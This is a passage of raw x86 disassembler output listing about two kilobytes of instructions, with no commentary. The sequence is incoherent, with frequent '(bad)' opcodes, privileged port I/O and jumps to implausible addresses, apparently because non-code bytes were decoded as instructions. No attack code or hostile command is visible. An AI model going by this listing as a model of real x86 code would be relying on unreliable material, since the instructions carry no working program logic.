  405007:	outs   dx,DWORD PTR ds:[esi]
  405008:	sub    eax,0xffd420a3
  40500d:	push   0x15
  40500f:	std    
  405010:	jo     0x40500e
  405012:	xor    ebx,edx
  405014:	xchg   ecx,eax
  405015:	mov    edx,0xaa4c836e
  40501a:	ret    
  40501b:	outs   dx,BYTE PTR ds:[esi]
  40501c:	pop    es
  40501d:	ins    BYTE PTR es:[edi],dx
  40501e:	push   cs
  40501f:	int    0xd5
  405021:	ret    0xe27f
  405024:	dec    edx
  405025:	imul   edx,DWORD PTR es:[ebp-0x53],0x562ce749
  40502d:	xor    al,0xa2
  40502f:	in     al,0x63
  405031:	mov    ah,0x60
  405033:	call   0x5c17:0xb81fc7b4
  40503a:	sub    ah,BYTE PTR [edx+0x6b]
  40503d:	or     al,0x93
  40503f:	sub    edi,edx
  405041:	fnstsw WORD PTR ds:0x92edd179
  405047:	push   esp
  405048:	push   eax
  405049:	loopne 0x40506c
  40504b:	pop    eax
  40504c:	inc    ecx
  40504d:	fdivr  DWORD PTR [ebx+0x2056640b]
  405053:	push   ebx
  405054:	shl    edi,1
  405056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405057:	dec    ebp
  405058:	sbb    eax,0x7fc0c418
  40505d:	nop
  40505e:	mov    esi,0xdcfbbe74
  405063:	and    dl,BYTE PTR [ecx]
  405065:	cdq    
  405066:	xchg   BYTE PTR [eax+0x43750d7d],bl
  40506c:	mov    eax,ds:0xa7b46ec5
  405071:	aaa    
  405072:	or     edi,DWORD PTR [edi+eax*2+0x28]
  405076:	mov    ebx,0xf8ad4251
  40507b:	xor    ebp,ecx
  40507d:	adc    eax,0x92aba209
  405082:	mov    dl,0xb2
  405084:	dec    ebp
  405085:	jb     0x4050cb
  405087:	mov    bh,0xe9
  405089:	in     al,dx
  40508a:	ja     0x405057
  40508c:	pop    ebx
  40508d:	(bad)  
  40508e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40508f:	jbe    0x4050a8
  405091:	mov    ds:0xd6033320,eax
  405096:	pop    ebx
  405097:	mov    edi,0x774d8064
  40509c:	push   ecx
  40509d:	sbb    DWORD PTR [edx+0x50638d3f],ebp
  4050a3:	xchg   esi,eax
  4050a4:	ds pop ebp
  4050a6:	ficom  WORD PTR [esp+ebp*8-0x6a]
  4050aa:	sbb    dl,0xa9
  4050ad:	imul   esp,DWORD PTR [esi-0x59468b6f],0x4b17e172
  4050b7:	jns    0x4050e2
  4050b9:	shl    DWORD PTR [ebx-0x1f],1
  4050bc:	loopne 0x40508d
  4050be:	nop
  4050bf:	adc    edi,DWORD PTR [edi]
  4050c1:	test   DWORD PTR [ecx-0x3d],eax
  4050c4:	ret    0x4940
  4050c7:	and    BYTE PTR [eax-0x75],bl
  4050ca:	ja     0x40509e
  4050cc:	mul    BYTE PTR [ebp-0x5b9a10b2]
  4050d2:	es mov ch,0x10
  4050d5:	mov    eax,DWORD PTR [esi]
  4050d7:	and    BYTE PTR [edi+0x5730e34c],0x5e
  4050de:	adc    eax,DWORD PTR [esi]
  4050e0:	sub    bl,BYTE PTR [edx-0x31]
  4050e3:	mov    edx,ebp
  4050e5:	inc    ebp
  4050e6:	sub    al,0xd8
  4050e8:	sbb    esi,edx
  4050ea:	xchg   edi,eax
  4050eb:	or     eax,esp
  4050ed:	and    ebx,0x3a
  4050f0:	push   esi
  4050f1:	je     0x40512d
  4050f3:	add    BYTE PTR [ebx+0x24c8f221],dl
  4050f9:	imul   ebx,DWORD PTR [ebx],0x5cf0a9d
  4050ff:	pop    edi
  405100:	rcr    BYTE PTR [esi],1
  405102:	stos   DWORD PTR es:[edi],eax
  405103:	jmp    0x40517e
  405105:	pop    eax
  405106:	int    0xac
  405108:	or     DWORD PTR [edx],eax
  40510a:	inc    edi
  40510b:	aad    0xeb
  40510d:	inc    esi
  40510f:	ja     0x40517c
  405111:	shl    cl,cl
  405113:	mov    ecx,0x575d334d
  405118:	jb     0x405168
  40511a:	xor    eax,ebx
  40511c:	mov    esp,0x4f3a6378
  405121:	popa   
  405122:	(bad)  
  405123:	xchg   esp,eax
  405124:	pop    ss
  405125:	mov    bh,0xac
  405127:	dec    BYTE PTR [ecx-0x1e]
  40512a:	int    0x16
  40512c:	out    dx,al
  40512d:	cmp    ch,ch
  40512f:	mov    dl,BYTE PTR [eax+0x7d]
  405132:	cld    
  405133:	jo     0x40511a
  405135:	lahf   
  405136:	mov    esi,DWORD PTR [ebx-0x5109840e]
  40513c:	pushf  
  40513d:	test   DWORD PTR [ebx],0x3dce0b24
  405143:	nop
  405144:	rcl    esp,0x6b
  405147:	ds call 0x95170b1a
  40514d:	outs   dx,DWORD PTR ds:[esi]
  40514e:	cmp    esp,DWORD PTR [ebp-0x3d7f5e6f]
  405154:	lea    esp,[esi]
  405156:	cmp    BYTE PTR [ebp-0x19],ch
  405159:	(bad)  
  40515a:	popf   
  40515b:	cs inc eax
  40515d:	jmp    0x330:0x6782353f
  405164:	test   eax,0xef26b8dc
  405169:	nop
  40516a:	stos   BYTE PTR es:[edi],al
  40516b:	jno    0x4051b0
  40516d:	mov    WORD PTR [ecx-0x53],?
  405170:	call   0xe351:0x4d398ff
  405177:	pop    esp
  405178:	hlt    
  405179:	mov    cl,0x69
  40517b:	scas   al,BYTE PTR es:[edi]
  40517c:	mov    BYTE PTR [edi-0x32],al
  40517f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405181:	xchg   edx,eax
  405182:	xor    ebx,DWORD PTR [edx+ebx*1+0x57]
  405186:	xor    al,0x9
  405188:	jne    0x40515f
  40518a:	push   es
  40518b:	lods   al,BYTE PTR ds:[esi]
  40518c:	xchg   esp,eax
  40518d:	push   es
  40518e:	xor    al,0xd7
  405190:	lods   al,BYTE PTR ds:[esi]
  405191:	push   ebp
  405192:	das    
  405193:	mov    BYTE PTR [edx],bh
  405195:	fwait
  405196:	(bad)  
  405197:	cmp    DWORD PTR [eax],edi
  405199:	inc    edi
  40519a:	clc    
  40519b:	add    cl,ch
  40519d:	shl    DWORD PTR ds:0xe1ab0b06,0x4a
  4051a4:	leave  
  4051a5:	stc    
  4051a6:	test   eax,0xf49525d
  4051ab:	out    dx,eax
  4051ac:	jl     0x40522a
  4051ae:	jmp    0xb356cdd2
  4051b3:	xor    DWORD PTR [ebx+0x1c5bf3ea],0x7f
  4051ba:	out    0x6e,eax
  4051bc:	push   ebp
  4051bd:	int    0x3c
  4051bf:	cmc    
  4051c0:	shl    DWORD PTR [eax+edx*1-0x2a],0x3f
  4051c5:	push   ss
  4051c6:	mov    ah,0xe8
  4051c8:	mov    eax,edx
  4051ca:	cli    
  4051cb:	push   0xffffff8d
  4051cd:	dec    edi
  4051ce:	out    dx,eax
  4051cf:	not    BYTE PTR [esi+0x41]
  4051d2:	out    dx,eax
  4051d3:	xor    DWORD PTR ds:0xc3185f19,edx
  4051d9:	outs   dx,BYTE PTR ds:[esi]
  4051da:	dec    ebp
  4051db:	ins    DWORD PTR es:[edi],dx
  4051dc:	retf   
  4051dd:	add    esi,DWORD PTR [edx-0x3a1e484a]
  4051e3:	(bad)  [edi-0xe]
  4051e6:	pop    edx
  4051e7:	out    dx,al
  4051e8:	dec    ecx
  4051e9:	(bad)  
  4051ea:	or     ebp,DWORD PTR [eax]
  4051ec:	data16 scas al,BYTE PTR es:[edi]
  4051ee:	pop    ebx
  4051ef:	pop    esp
  4051f0:	and    esi,DWORD PTR [edx]
  4051f2:	mov    DWORD PTR [edi+edx*1+0xb],0x39f10a06
  4051fa:	xor    bl,0xc3
  4051fd:	clc    
  4051fe:	or     ah,BYTE PTR [edx+0x2027c88a]
  405204:	push   edx
  405205:	or     al,ah
  405207:	sub    eax,0x9b7aba9a
  40520c:	pop    eax
  40520d:	lock pop esp
  40520f:	inc    ebp
  405210:	fs ret 
  405212:	js     0x4051a3
  405214:	mov    ebx,0x6e631649
  405219:	pop    ebp
  40521a:	sub    esi,DWORD PTR [ebx]
  40521c:	push   0xffffff8c
  40521e:	scas   al,BYTE PTR es:[edi]
  40521f:	jns    0x405211
  405221:	lea    eax,[edi+0x1b]
  405224:	mov    ds,WORD PTR [esi]
  405226:	adc    al,0x83
  405228:	xchg   ebx,eax
  405229:	jno    0x405264
  40522b:	or     DWORD PTR [ebp+0x25],esi
  40522e:	pop    ecx
  40522f:	pop    ebx
  405230:	or     ch,BYTE PTR [edi]
  405232:	mov    cl,BYTE PTR [edx+edi*8-0x48]
  405236:	inc    ebx
  405237:	push   edi
  405238:	cmp    al,0xd1
  40523a:	je     0x40524e
  40523c:	mov    eax,edi
  40523e:	leave  
  40523f:	xchg   DWORD PTR [ecx-0x27d69e01],eax
  405245:	icebp  
  405246:	(bad)  
  405247:	fadd   DWORD PTR [edi]
  405249:	std    
  40524a:	xlat   BYTE PTR ds:[ebx]
  40524b:	xchg   DWORD PTR [edi+eax*1],esp
  40524e:	ret    
  40524f:	iret   
  405250:	mov    edx,0x597e2c5b
  405255:	xchg   edi,eax
  405256:	push   es
  405257:	addr16 repnz sahf 
  40525a:	aas    
  40525b:	adc    eax,0x1ed5274c
  405260:	fist   WORD PTR ds:0x69409d42
  405266:	adc    ebp,DWORD PTR [ecx]
  405268:	push   ecx
  405269:	pop    ecx
  40526a:	mov    bh,0x66
  40526c:	inc    esp
  40526d:	sub    eax,0xb9aa962e
  405272:	cmp    esi,DWORD PTR [eax+0x4e]
  405275:	shr    DWORD PTR [bp+si+0x79f4],0x1b
  40527b:	ins    BYTE PTR es:[edi],dx
  40527c:	or     ebx,DWORD PTR [ecx-0x2]
  40527f:	jle    0x4052ee
  405281:	push   edx
  405282:	dec    ebx
  405283:	leave  
  405284:	push   es
  405285:	(bad)  
  405286:	aas    
  405287:	sub    eax,edx
  405289:	jge    0x405210
  40528b:	in     eax,dx
  40528c:	jae    0x4052a7
  40528e:	mov    ?,WORD PTR [ecx-0x58]
  405291:	jmp    0x4052ba
  405293:	clc    
  405294:	jmp    0x405282
  405296:	sbb    al,0x54
  405298:	cwde   
  405299:	jne    0x405274
  40529b:	pop    ebx
  40529c:	push   esi
  40529d:	(bad)  
  40529e:	fdivrp st(0),st
  4052a0:	cmp    bl,BYTE PTR [esi+0x68f330f7]
  4052a6:	and    al,0xef
  4052a8:	and    eax,0xdc0edd0b
  4052ad:	sub    BYTE PTR [edi+edi*2-0x56],0x1f
  4052b2:	std    
  4052b3:	outs   dx,BYTE PTR ds:[esi]
  4052b4:	mul    DWORD PTR [edx]
  4052b6:	repz arpl WORD PTR [edi],sp
  4052b9:	dec    esi
  4052ba:	call   0x996c:0x97ee07d1
  4052c1:	hlt    
  4052c2:	imul   esp,esp,0xd0b49394
  4052c8:	mov    eax,ds:0x8c2e12c0
  4052cd:	out    0xad,eax
  4052cf:	xchg   esp,eax
  4052d0:	jmp    0x152abf79
  4052d5:	mov    WORD PTR [edx+0x16af0e94],ds
  4052db:	ret    0xbb1f
  4052de:	cwde   
  4052df:	add    ecx,DWORD PTR [ebx-0x34bd6837]
  4052e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052e6:	addr16 test ebp,0x2b0b8843
  4052ed:	stos   DWORD PTR es:[edi],eax
  4052ee:	inc    esp
  4052ef:	and    al,0xcf
  4052f1:	lahf   
  4052f2:	sub    al,0xf3
  4052f4:	push   cs
  4052f5:	push   edx
  4052f6:	or     bl,BYTE PTR [eax+eax*2]
  4052f9:	sbb    al,0x15
  4052fb:	or     ecx,esp
  4052fd:	int    0xdf
  4052ff:	xlat   BYTE PTR ds:[ebx]
  405300:	fbstp  TBYTE PTR [eax]
  405302:	std    
  405303:	jae    0x4052a7
  405305:	mov    bl,0x84
  405307:	mov    ds:0x4847499e,eax
  40530c:	mov    bl,0x64
  40530e:	fisub  WORD PTR [ecx+0x59304d33]
  405314:	push   esi
  405315:	cmc    
  405316:	repnz arpl si,bp
  405319:	push   eax
  40531a:	lahf   
  40531b:	push   ss
  40531c:	jbe    0x4052b0
  40531e:	mov    bl,0xbd
  405320:	dec    ebx
  405321:	cmp    esi,esp
  405323:	ffree  st(3)
  405325:	in     eax,dx
  405326:	mov    ebp,0x19a682c8
  40532b:	push   ebx
  40532c:	ret    0xa80b
  40532f:	aam    0x89
  405331:	aad    0xd7
  405333:	loopne 0x4052d1
  405335:	loop   0x4052ed
  405337:	inc    edx
  405338:	shl    DWORD PTR [edi+edi*4+0x60],1
  40533c:	inc    esi
  40533d:	leave  
  40533e:	cmp    eax,0xf257feb6
  405343:	sbb    ecx,DWORD PTR ds:0x70a0131e
  405349:	pop    esp
  40534a:	das    
  40534b:	ins    BYTE PTR es:[edi],dx
  40534c:	jne    0x405307
  40534e:	jbe    0x4053a0
  405350:	xor    al,dl
  405352:	pusha  
  405353:	xor    eax,0xdd23dc35
  405358:	cmp    al,0xb1
  40535a:	imul   edx,edi,0xba208b4f
  405360:	add    eax,0x85a42609
  405365:	xchg   ecx,eax
  405366:	fstp   DWORD PTR [ebx]
  405368:	test   DWORD PTR [eax-0x26],esi
  40536b:	mov    edi,0x10e02db0
  405370:	cmp    eax,0x42d4bc0a
  405375:	fdiv   QWORD PTR [edx+0x24e5919f]
  40537b:	data16 sbb ch,BYTE PTR [ebp-0x43]
  40537f:	(bad)  
  405380:	xor    cl,dl
  405382:	rcl    DWORD PTR [edi],cl
  405384:	sub    BYTE PTR [ebx+0x5d],cl
  405387:	mov    bh,0x87
  405389:	fisttp DWORD PTR [edx]
  40538b:	pop    ebx
  40538c:	push   0x676c2495
  405391:	cs das 
  405393:	addr16 pop ds
  405395:	aaa    
  405396:	popa   
  405397:	jge    0x405414
  405399:	sti    
  40539a:	push   ebx
  40539b:	repnz scas al,BYTE PTR es:[edi]
  40539d:	sbb    cl,0xad
  4053a0:	addr16 mov ebx,0x7917d333
  4053a6:	out    0xf6,eax
  4053a8:	lods   al,BYTE PTR ds:[esi]
  4053a9:	mov    al,ds:0xc7803356
  4053ae:	sub    BYTE PTR [ebp+0x3d],0x1e
  4053b2:	xchg   BYTE PTR [edx+0x377096e8],al
  4053b8:	ds repnz or ecx,ecx
  4053bc:	test   BYTE PTR [ecx-0x2f4175e],dl
  4053c2:	pusha  
  4053c3:	and    ch,al
  4053c5:	sti    
  4053c6:	fwait
  4053c7:	mov    ebp,0x9cb48bd2
  4053cc:	js     0x4053d2
  4053ce:	imul   ebx,DWORD PTR [ecx+0x67],0x2fb3ec2b
  4053d5:	fisub  WORD PTR [ebp-0x602c4cde]
  4053db:	in     eax,0x32
  4053dd:	sbb    eax,0x1aed7aaa
  4053e2:	imul   esi,DWORD PTR [eax-0x50177585],0x3a
  4053e9:	xchg   edx,eax
  4053ea:	(bad)  
  4053eb:	rcl    BYTE PTR [ebp+0x586457cb],0x2b
  4053f2:	xchg   BYTE PTR [ebx],ah
  4053f4:	mov    dl,0x2c
  4053f6:	cmc    
  4053f7:	jecxz  0x40543b
  4053f9:	fmul   DWORD PTR [ebp-0x24]
  4053fc:	mov    bh,BYTE PTR [eax+edi*2-0x6edda4c0]
  405403:	mov    ebp,0x180c3591
  405408:	cld    
  405409:	mov    ebx,0xf4b33fa0
  40540e:	sub    BYTE PTR [ebp-0x62937f2a],bl
  405414:	mov    dh,0xbd
  405416:	pop    ecx
  405417:	adc    cl,BYTE PTR [ecx-0x57a911c9]
  40541d:	bound  ecx,QWORD PTR [ecx+ecx*4]
  405420:	ds in  eax,dx
  405422:	sub    al,0x92
  405424:	(bad)  
  405425:	out    0xf5,ax
  405428:	test   al,0x9c
  40542a:	mov    ds:0x57bd6cd4,al
  40542f:	fs std 
  405431:	xchg   edi,eax
  405432:	in     eax,dx
  405433:	repz xlat BYTE PTR ds:[ebx]
  405435:	fnsave [ebx*1+0x67496f26]
  40543c:	or     eax,0x904f195f
  405441:	loope  0x405421
  405443:	not    bh
  405445:	mov    ebp,0x62ac8987
  40544a:	mov    ecx,0x85a6377c
  40544f:	retf   0x2ea0
  405452:	ins    BYTE PTR es:[edi],dx
  405453:	int3   
  405454:	popf   
  405455:	mov    dh,0xac
  405457:	xchg   esi,eax
  405458:	pushf  
  405459:	push   0x7ea1548d
  40545e:	push   ebp
  40545f:	and    DWORD PTR [edi+ecx*2],ebx
  405462:	add    esp,eax
  405464:	sti    
  405465:	and    DWORD PTR [esi-0x28841ef0],esp
  40546b:	push   es
  40546c:	ret    0x4462
  40546f:	pop    esi
  405470:	dec    edi
  405471:	or     eax,0x3d33c497
  405476:	rcl    DWORD PTR [edi+ecx*1+0x4d],cl
  40547a:	fimul  WORD PTR [ebp-0x48]
  40547d:	out    0x1b,al
  40547f:	pop    eax
  405480:	fdivr  QWORD PTR [ecx-0x7c43a46e]
  405486:	jo     0x40540c
  405488:	fisubr WORD PTR [ecx+0x57]
  40548b:	dec    ebp
  40548c:	push   ebp
  40548d:	loop   0x405444
  40548f:	xor    edx,DWORD PTR [ecx-0x5a]
  405492:	mov    cl,0xd
  405494:	ret    
  405495:	pushf  
  405496:	(bad)  [edx-0x6f978c34]
  40549c:	dec    edx
  40549d:	sar    BYTE PTR ds:0x95066955,cl
  4054a3:	mov    edx,0x1ace2863
  4054a8:	mov    ecx,0x5c1cae0b
  4054ad:	(bad)  
  4054ae:	and    ecx,ecx
  4054b0:	mov    ds:0xf5f75a88,eax
  4054b5:	daa    
  4054b6:	push   ss
  4054b7:	sub    BYTE PTR [ecx],al
  4054b9:	xor    ah,BYTE PTR [ebp-0x63]
  4054bc:	aam    0xd1
  4054be:	jge    0x405461
  4054c0:	sbb    BYTE PTR [edi],bh
  4054c2:	lods   al,BYTE PTR ds:[esi]
  4054c3:	sub    DWORD PTR [edi+0x67],ecx
  4054c6:	je     0x405459
  4054c8:	bound  eax,QWORD PTR [ebx+0x22]
  4054cb:	and    ecx,ecx
  4054cd:	mov    ch,bl
  4054cf:	mov    ds:0x61ba0505,al
  4054d4:	mov    edx,0xaa155857
  4054d9:	data16 add dl,BYTE PTR [ebp+esi*2-0x70bc5d4f]
  4054e1:	in     al,dx
  4054e2:	sbb    edx,DWORD PTR [ebx]
  4054e4:	dec    ecx
  4054e5:	dec    ecx
  4054e6:	inc    ebx
  4054e7:	int    0xaf
  4054e9:	das    
  4054ea:	test   eax,0xf1b342cd
  4054ef:	stos   DWORD PTR es:[edi],eax
  4054f0:	adc    dh,BYTE PTR [esi]
  4054f2:	mov    ch,0x9
  4054f4:	adc    al,0x29
  4054f6:	lods   al,BYTE PTR ds:[esi]
  4054f7:	inc    esp
  4054f8:	dec    edx
  4054f9:	pop    esp
  4054fa:	call   0xbb727c06
  4054ff:	add    eax,0x27386f85
  405504:	hlt    
  405505:	adc    eax,0xfb1e2aca
  40550a:	push   ecx
  40550b:	xchg   edx,eax
  40550d:	and    BYTE PTR [edi-0x66b7de30],bl
  405513:	cld    
  405514:	aas    
  405515:	sbb    DWORD PTR [edi+ebp*4-0x62f37f16],0x56
  40551d:	mov    al,0x49
  40551f:	outs   dx,BYTE PTR ds:[esi]
  405520:	adc    BYTE PTR [ebx*8+0x3a2b2909],ah
  405527:	dec    ecx
  405528:	and    ecx,DWORD PTR [edi+0x45]
  40552b:	pop    es
  40552c:	adc    eax,0x32307667
  405531:	icebp  
  405532:	fimul  WORD PTR [esi]
  405534:	or     DWORD PTR [ebx+esi*8],esp
  405537:	or     al,0x6
  405539:	scas   eax,DWORD PTR es:[edi]
  40553a:	add    ch,BYTE PTR [esi-0x32]
  40553d:	jnp    0x405508
  40553f:	jg     0x405584
  405541:	xlat   BYTE PTR ds:[ebx]
  405542:	ds mov ebp,0x27e80f5a
  405548:	push   edx
  405549:	jp     0x40555e
  40554b:	jmp    0xd854:0x4883ba48
  405552:	cmp    al,0x7b
  405554:	int    0xc
  405556:	mov    WORD PTR [esi],fs
  405558:	ror    BYTE PTR [eax],1
  40555a:	pop    esi
  40555b:	js     0x405546
  40555d:	pop    eax
  40555e:	into   
  40555f:	mov    ?,WORD PTR [ecx-0x100c5558]
  405565:	mov    dl,0xdc
  405567:	cld    
  405568:	inc    esi
  405569:	jp     0x40558e
  40556b:	adc    BYTE PTR [edx-0x2c],dh
  40556e:	retf   
  40556f:	push   esp
  405570:	sub    edx,DWORD PTR cs:[edx-0x4ed12a55]
  405577:	push   es
  405578:	pushf  
  405579:	sbb    DWORD PTR [edi-0x3a4de457],eax
  40557f:	enter  0xacd6,0xde
  405583:	retf   
  405584:	or     DWORD PTR [ecx+0x2],ebx
  405587:	ds (bad) 
  405589:	xor    ebx,DWORD PTR [ebx]
  40558b:	add    al,dh
  40558d:	fist   WORD PTR [ebp+eiz*2+0x3d]
  405591:	xchg   ebx,eax
  405592:	daa    
  405593:	sbb    eax,0xe32ced09
  405598:	sub    dh,dl
  40559a:	or     BYTE PTR [ecx+0x18],bl
  40559d:	push   0xffffff96
  40559f:	aas    
  4055a0:	scas   eax,DWORD PTR es:[edi]
  4055a1:	push   0xd244c7fa
  4055a6:	pop    edi
  4055a7:	pop    es
  4055a8:	in     eax,0x5f
  4055aa:	cwde   
  4055ab:	not    BYTE PTR [esi+0x26]
  4055ae:	pop    eax
  4055af:	scas   al,BYTE PTR es:[edi]
  4055b0:	cmp    al,0xd5
  4055b2:	inc    ecx
  4055b3:	aam    0x91
  4055b5:	ret    0xd0d7
  4055b8:	in     eax,0x13
  4055ba:	pop    ebx
  4055bb:	in     eax,0xac
  4055bd:	lea    esp,[ecx+0x178d4277]
  4055c3:	daa    
  4055c4:	xchg   esp,eax
  4055c5:	imul   eax,edi,0xe7ddb01d
  4055cb:	sbb    eax,0x28605ab0
  4055d0:	jl     0x405602
  4055d2:	xor    eax,0xd8849e83
  4055d7:	out    dx,eax
  4055d8:	(bad)  
  4055d9:	sti    
  4055da:	shl    ecx,1
  4055dc:	dec    eax
  4055dd:	arpl   WORD PTR [eax-0x28],bp
  4055e0:	jge    0x40560a
  4055e2:	cli    
  4055e3:	pop    edi
  4055e4:	push   ebp
  4055e5:	pop    edi
  4055e6:	and    esi,DWORD PTR [edi+0xf]
  4055e9:	aam    0x96
  4055eb:	sub    al,0xd9
  4055ed:	dec    esi
  4055ee:	fidiv  WORD PTR [edi]
  4055f0:	adc    BYTE PTR [eax+edi*4-0x260d64dc],cl
  4055f7:	arpl   WORD PTR [ebx-0x70],di
  4055fa:	jns    0x405630
  4055fc:	cli    
  4055fd:	in     eax,dx
  4055fe:	cmc    
  4055ff:	xchg   edx,eax
  405600:	sub    eax,0xc137d0da
  405605:	jmp    0x90f42a97
  40560a:	sbb    ebp,DWORD PTR [edi+edx*2-0x78]
  40560e:	in     eax,0xcc
  405610:	fsubp  st(7),st
  405612:	mov    dl,BYTE PTR [edx]
  405614:	jns    0x4055df
  405616:	adc    BYTE PTR [ecx-0x79db9447],cl
  40561c:	jmp    0x5a4b6695
  405621:	aas    
  405622:	push   es
  405623:	and    al,BYTE PTR ds:0x5c22c2c
  405629:	push   edx
  40562a:	mov    cs,WORD PTR [esi+0x29]
  40562d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40562e:	fldcw  WORD PTR [ebx+0x124fd097]
  405634:	jp     0x4055da
  405636:	int3   
  405637:	adc    bl,dh
  405639:	jle    0x40568f
  40563b:	sub    ebx,DWORD PTR [edx+0x5a]
  40563e:	inc    esp
  40563f:	imul   esp,DWORD PTR [esi+0x33d0f19a],0x60ca477a
  405649:	mov    esp,ebp
  40564b:	inc    eax
  40564c:	cmp    BYTE PTR [ebx+0x55b7e8c5],dh
  405652:	rcr    BYTE PTR [eax-0x13d6b09b],0x7e
  405659:	mov    eax,0x105dd353
  40565e:	(bad)  
  40565f:	mov    dl,0xa9
  405661:	mov    ah,bl
  405663:	aad    0xb5
  405665:	aas    
  405666:	fimul  DWORD PTR [eax+0x3f]
  405669:	loope  0x40563e
  40566b:	xchg   ecx,eax
  40566c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40566d:	fisubr DWORD PTR [edi]
  40566f:	(bad)  
  405671:	cmp    ch,dh
  405673:	push   0x4f6a789c
  405678:	mov    esi,ebp
  40567a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40567b:	in     al,dx
  40567c:	xchg   ebx,eax
  40567d:	cs dec ebp
  40567f:	sbb    al,0xcc
  405681:	add    eax,0x837362f7
  405686:	stc    
  405687:	ins    WORD PTR es:[edi],dx
  405689:	aas    
  40568a:	pushf  
  40568b:	xor    al,0xf3
  40568d:	dec    ebx
  40568e:	clc    
  40568f:	js     0x40563d
  405691:	aad    0xda
  405693:	into   
  405694:	stos   BYTE PTR es:[edi],al
  405695:	sbb    DWORD PTR [esi+0x4ab20cf5],esi
  40569b:	mov    eax,DWORD PTR [esi+0x37]
  40569e:	push   0xc72b4bf8
  4056a3:	data16 stc 
  4056a5:	mov    bl,0x62
  4056a7:	push   0xffffffb1
  4056a9:	sub    DWORD PTR [edi-0x78],edi
  4056ac:	aad    0xea
  4056ae:	sub    dh,BYTE PTR [ebx]
  4056b0:	cmp    eax,0x8a3845
  4056b5:	push   ebx
  4056b6:	mov    BYTE PTR [esi-0x32d32710],cl
  4056bc:	repnz into 
  4056be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bf:	jb     0x405715
  4056c1:	jnp    0x40571a
  4056c3:	xlat   BYTE PTR ds:[ebx]
  4056c4:	sub    BYTE PTR [edx-0x5e3fcf0d],bh
  4056ca:	gs cld 
  4056cc:	lea    edx,[edx-0x6f]
  4056cf:	stos   BYTE PTR es:[edi],al
  4056d0:	ret    0xdf9d
  4056d3:	repz scas al,BYTE PTR es:[edi]
  4056d5:	pop    eax
  4056d6:	jns    0x4056de
  4056d8:	dec    edi
  4056d9:	addr16 jl 0x40566a
  4056dc:	inc    ebx
  4056dd:	mov    BYTE PTR [edx-0x26586c79],dl
  4056e3:	test   edi,edi
  4056e5:	sbb    edi,DWORD PTR [ebp+0x78ec1930]
  4056eb:	sub    esp,DWORD PTR [edx-0x167328a1]
  4056f1:	enter  0x2f8a,0x8a
  4056f5:	imul   eax,DWORD PTR [eax-0x44],0x3a
  4056f9:	scas   eax,DWORD PTR es:[edi]
  4056fa:	popf   
  4056fb:	push   ds
  4056fc:	pop    ds
  4056fd:	mov    cl,0xd3
  4056ff:	cmp    DWORD PTR [edx],0xffffffb2
  405702:	call   0xfda553de
  405707:	pop    esi
  405708:	mov    eax,ds:0xebaa0bc8
  40570d:	sbb    eax,DWORD PTR [edx]
  40570f:	aam    0x82
  405711:	sub    esi,DWORD PTR [esi-0x4491701f]
  405717:	or     cl,cl
  405719:	leave  
  40571a:	sub    eax,0x2d2ef86b
  40571f:	leave  
  405720:	test   BYTE PTR [ecx-0x4a],dl
  405723:	inc    edi
  405724:	add    DWORD PTR [eax],esp
  405726:	dec    edx
  405727:	adc    BYTE PTR [ebp+edi*1+0x1e],dh
  40572b:	adc    BYTE PTR [eax],dh
  40572d:	lods   eax,DWORD PTR ds:[esi]
  40572e:	dec    ebx
  40572f:	(bad)  
  405730:	jmp    DWORD PTR [ebp+0x99ad8fc]
  405736:	dec    ebx
  405737:	in     eax,0xd1
  405739:	jl     0x4056e9
  40573b:	fsub   DWORD PTR [esi+ebx*1+0xf355033]
  405742:	cmp    DWORD PTR [edi],0xffffffb9
  405745:	out    dx,eax
  405746:	xchg   esp,eax
  405747:	or     DWORD PTR [edx],eax
  405749:	fistp  DWORD PTR [eax-0x34]
  40574c:	lods   eax,DWORD PTR ds:[esi]
  40574d:	push   ss
  40574e:	mov    ebp,0x73456cf6
  405753:	xchg   edi,eax
  405754:	mov    ecx,0x2690c51a
  405759:	add    cl,al
  40575b:	and    al,0xa9
  40575d:	inc    eax
  40575e:	add    dl,BYTE PTR [eax]
  405760:	fidiv  DWORD PTR [ecx-0x79]
  405763:	nop
  405764:	add    eax,0x9ab6b892
  405769:	js     0x405764
  40576b:	aam    0x79
  40576d:	or     BYTE PTR [edx-0x2],bl
  405770:	out    0xcd,al
  405772:	inc    ebp
  405773:	and    ah,BYTE PTR [edx]
  405775:	lods   eax,DWORD PTR ds:[esi]
  405776:	outs   dx,BYTE PTR ds:[esi]
  405777:	or     esp,DWORD PTR [esi-0x38029b03]
  40577d:	out    0xd4,eax
  40577f:	lock adc edi,DWORD PTR [edi+edx*1+0x71218b9a]
  405787:	int3   
  405788:	out    0x87,al
  40578a:	dec    eax
  40578b:	call   DWORD PTR [edi]
  40578d:	aaa    
  40578e:	dec    ebp
  40578f:	neg    esp
  405791:	stos   BYTE PTR es:[edi],al
  405792:	icebp  
  405793:	paddq  mm1,mm1
  405796:	mov    ecx,0x5095a95d
  40579b:	cmp    eax,edx
  40579d:	leave  
  40579e:	or     bh,cl
  4057a0:	and    DWORD PTR [ebp+0x37],0xd0d65478
  4057a7:	xchg   edi,eax
  4057a8:	xchg   edi,eax
  4057a9:	repz push 0x1a
  4057ac:	dec    ecx
  4057ad:	sbb    eax,edi
  4057af:	cmp    ch,ah
  4057b1:	inc    eax
  4057b2:	and    DWORD PTR ds:0xc8a32c93,eax
  4057b8:	loope  0x4057ef
  4057ba:	mov    ds:0x9a061ee5,eax
  4057bf:	in     eax,0x60
  4057c1:	push   ebp
  4057c2:	test   BYTE PTR [edx-0x3c529a62],bl
  4057c8:	jno    0x405825
  4057ca:	push   eax
  4057cb:	into   
  4057cc:	sbb    al,0x54
  4057ce:	les    esi,FWORD PTR [ebp+0x741075db]
  4057d4:	mov    esp,edi
  4057d6:	jp     0x405830
  4057d8:	xchg   ebx,eax
  4057d9:	clc    
  4057da:	pop    esp
  4057db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057dc:	add    esp,DWORD PTR [edx+eiz*2+0x6c]
  4057e0:	jmp    0x7946542e
  4057e5:	(bad)
  4057e9:	xchg   edi,eax
